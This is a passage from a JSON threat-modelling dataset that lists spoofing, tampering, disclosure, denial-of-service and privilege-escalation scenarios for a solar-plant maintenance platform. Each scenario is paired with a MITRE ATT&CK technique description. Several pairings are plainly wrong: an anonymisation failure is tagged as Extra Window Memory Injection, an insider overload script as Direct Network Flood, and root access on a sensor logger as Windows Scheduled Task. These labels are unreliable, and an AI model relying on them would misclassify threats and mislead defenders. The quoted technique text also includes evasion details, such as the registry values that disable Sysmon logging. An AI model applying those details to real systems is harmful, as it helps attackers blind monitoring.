                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability to access sensitive metadata about solar power plants, exposing operational and ownership details.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerability is present and unmitigated.",
                    "Role": "Developer",
                    "Condition": "Software vulnerabilities exist."
                },
                {
                    "Assumption": "The attacker can discover and exploit the vulnerability.",
                    "Role": "External Attacker",
                    "Condition": "Technical knowledge and access to exploit."
                },
                {
                    "Assumption": "The system does not employ sufficient encryption or access controls.",
                    "Role": "System Architect",
                    "Condition": "Inadequate security measures."
                }
            ],
            "Potential Impact": "Breach of confidentiality with potential financial and reputational damage.",
            "MITRE ATT&CK Keywords": [
                "vulnerability",
                "exploit",
                "information disclosure",
                "metadata"
            ],
            "mitre_technique": {
                "name": "Vulnerabilities",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database)\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).",
                "id": "attack-pattern--2b5aa86b-a0df-4382-848d-30abea443327",
                "technique_id": "T1588.006"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive sensor data is intercepted in transit due to lack of encryption, making it accessible to unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over unencrypted channels.",
                    "Role": "Network Engineer",
                    "Condition": "Lack of secure communication protocols."
                },
                {
                    "Assumption": "The attacker has network access to capture data.",
                    "Role": "Network Intruder",
                    "Condition": "Compromised network access."
                },
                {
                    "Assumption": "No end-to-end encryption is implemented.",
                    "Role": "Security Architect",
                    "Condition": "Absence of encryption mechanisms."
                }
            ],
            "Potential Impact": "Exposure of sensitive sensor data, leading to potential misuse or analysis by unauthorized entities.",
            "MITRE ATT&CK Keywords": [
                "data",
                "channel",
                "interception",
                "disclosure"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insufficient de-identification by the Anonymity Agent results in re-identifiable training data being exposed.",
            "Assumptions": [
                {
                    "Assumption": "De-identification processes are flawed.",
                    "Role": "Data Engineer",
                    "Condition": "Improper de-identification methodologies."
                },
                {
                    "Assumption": "The data scientist inadvertently uses identifiable data.",
                    "Role": "Data Scientist",
                    "Condition": "Lack of awareness or negligence."
                },
                {
                    "Assumption": "Inadequate validation of anonymization techniques.",
                    "Role": "Quality Assurance",
                    "Condition": "Weak validation processes."
                }
            ],
            "Potential Impact": "Compromise of personal and sensitive data, violating privacy agreements and regulations.",
            "MITRE ATT&CK Keywords": [
                "data",
                "anonymization",
                "de-identification",
                "disclosure"
            ],
            "mitre_technique": {
                "name": "Extra Window Memory Injection",
                "description": "Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process\u2019s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process\u2019s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ",
                "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
                "technique_id": "T1055.011"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack targets the TOREADOR platform, overwhelming it with traffic and disrupting service.",
            "Assumptions": [
                {
                    "Assumption": "TOREADOR platform is accessible over the internet.",
                    "Role": "System Architect",
                    "Condition": "Internet-facing service."
                },
                {
                    "Assumption": "No sufficient DDoS mitigation measures in place.",
                    "Role": "Network Security Team",
                    "Condition": "Lack of DDoS protection strategies."
                },
                {
                    "Assumption": "Attackers possess botnet capabilities.",
                    "Role": "External Threat Actor",
                    "Condition": "Use of botnets for DDoS."
                }
            ],
            "Potential Impact": "Service unavailability, affecting real-time predictive maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "network",
                "ddos",
                "disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware introduced by the command-and-control domains disrupts the normal operations of the Data Logger, halting data collection.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not fully monitored.",
                    "Role": "Operations Team",
                    "Condition": "Lack of continuous monitoring."
                },
                {
                    "Assumption": "Data Logger has vulnerabilities that can be exploited by malware.",
                    "Role": "Hardware Designer",
                    "Condition": "Presence of exploitable vulnerabilities."
                },
                {
                    "Assumption": "Malware detection mechanisms are not robust.",
                    "Role": "Security Team",
                    "Condition": "Ineffective malware defense systems."
                }
            ],
            "Potential Impact": "Halts data collection, leading to a lapse in predictive maintenance activities and real-time updates.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "command-and-control",
                "disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider executes a script causing system overload within the LIGHT ICT infrastructure, resulting in service interruption.",
            "Assumptions": [
                {
                    "Assumption": "The insider has sufficient access privileges.",
                    "Role": "Authorized Personnel",
                    "Condition": "High-level access permissions."
                },
                {
                    "Assumption": "Security measures on the LIGHT ICT infrastructure are insufficient.",
                    "Role": "System Architect",
                    "Condition": "Lack of stringent security controls."
                },
                {
                    "Assumption": "No rate-limiting or resource allocation measures to mitigate system overload.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate balancing mechanisms."
                }
            ],
            "Potential Impact": "Temporary service unavailability, hindering predictive maintenance and power flow optimization.",
            "MITRE ATT&CK Keywords": [
                "insider",
                "script",
                "disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the Receiver to gain elevated privileges, allowing full control over data pre-processing.",
            "Assumptions": [
                {
                    "Assumption": "Presence of an unpatched zero-day vulnerability.",
                    "Role": "Developer",
                    "Condition": "Software vulnerabilities exist."
                },
                {
                    "Assumption": "The attacker has knowledge and tools to exploit the vulnerability.",
                    "Role": "External Threat Actor",
                    "Condition": "Use of advanced exploitation techniques."
                },
                {
                    "Assumption": "No sufficient privilege escalation protections.",
                    "Role": "Security Architect",
                    "Condition": "Lack of robust security measures."
                }
            ],
            "Potential Impact": "Full control over data pre-processing, leading to potential data corruption and manipulation.",
            "MITRE ATT&CK Keywords": [
                "exploitation",
                "privilege escalation",
                "vulnerability",
                "receiver"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider with restricted access manipulates access controls to gain admin privileges on the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "Insider has basic access to the TOREADOR platform.",
                    "Role": "Authorized User",
                    "Condition": "Existing user of the system."
                },
                {
                    "Assumption": "Access control measures can be bypassed or escalated.",
                    "Role": "System Architect",
                    "Condition": "Weak access control mechanisms."
                },
                {
                    "Assumption": "No monitoring mechanisms to detect access control changes.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient monitoring systems."
                }
            ],
            "Potential Impact": "Unauthorized data and model manipulation, impacting overall system functionality.",
            "MITRE ATT&CK Keywords": [
                "insider",
                "access control",
                "manipulation",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malware exploits a vulnerability to gain root access on the Data Logger, enabling it to alter data at will.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger has exploitable vulnerabilities.",
                    "Role": "Hardware Designer",
                    "Condition": "Presence of vulnerabilities."
                },
                {
                    "Assumption": "Malware can execute without detection.",
                    "Role": "External Attacker",
                    "Condition": "Weak malware detection defenses."
                },
                {
                    "Assumption": "Firmware lacks robust security features.",
                    "Role": "Firmware Developer",
                    "Condition": "Weak firmware security."
                }
            ],
            "Potential Impact": "Complete control over data integrity and confidentiality of sensor data, leading to potential undetected manipulations.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "root access",
                "data",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Scheduled Task",
                "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
                "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
                "technique_id": "T1053.005"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "13",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the Dashboard by spoofing the identity of a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network and can intercept or steal login credentials.",
                    "Role": "Any unauthorized individual with network access",
                    "Condition": "The communication between users and the Dashboard is not adequately secured (e.g., lacks encryption)."
                },
                {
                    "Assumption": "The attacker has social-engineering skills to deceive employees to gain their credentials.",
                    "Role": "Social engineer",
                    "Condition": "Employees are not adequately trained on security best practices and phishing techniques."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive operational and predictive data leading to data confidentiality and integrity breaches.",
            "MITRE ATT&CK Keywords": [
                "Credential Access",
                "User Impersonation",
                "Phishing",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious actor spoofs sensor identities to send fake data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access or replicate sensor communication protocols.",
                    "Role": "Skilled attacker with knowledge of the sensor network",
                    "Condition": "Lack of strong authentication mechanisms for sensors."
                },
                {
                    "Assumption": "Sensors are not using unique cryptographic keys for their communications",
                    "Role": "Attacker with cryptographic expertise",
                    "Condition": "Weak or reused cryptographic keys in the sensor network."
                }
            ],
            "Potential Impact": "Integrity of the predictive maintenance and power optimization functions is compromised by false data inputs.",
            "MITRE ATT&CK Keywords": [
                "Sensor Spoofing",
                "Device Impersonation",
                "Injection",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker emulates a legitimate Receiver component to intercept and alter data during transit.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can route network traffic to their controlled device.",
                    "Role": "Network attacker with man-in-the-middle capabilities",
                    "Condition": "Weak network security controls, such as unencrypted data transmission."
                },
                {
                    "Assumption": "Authentication between the Data Logger and Receiver is not robust enough.",
                    "Role": "Attacker with network interception capabilities",
                    "Condition": "Lack of mutual authentication protocols."
                }
            ],
            "Potential Impact": "Confidentiality and integrity of data are compromised as the attacker can view and modify data in transit.",
            "MITRE ATT&CK Keywords": [
                "MITM",
                "Network Eavesdropping",
                "Fake Receiver",
                "Network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies sensor data in the Data Logger before it\u2019s transmitted to the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the Data Logger.",
                    "Role": "Insider or physical attacker",
                    "Condition": "Inadequate physical security controls."
                },
                {
                    "Assumption": "The Data Logger's software or firmware contains exploitable vulnerabilities.",
                    "Role": "Attacker with knowledge of the Data Logger's vulnerabilities",
                    "Condition": "Unpatched or outdated software/firmware in the Data Logger."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to inaccurate predictive maintenance and power optimization decisions.",
            "MITRE ATT&CK Keywords": [
                "Tampering",
                "Firmware Modification",
                "Insider Attack",
                "Physical Access"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: 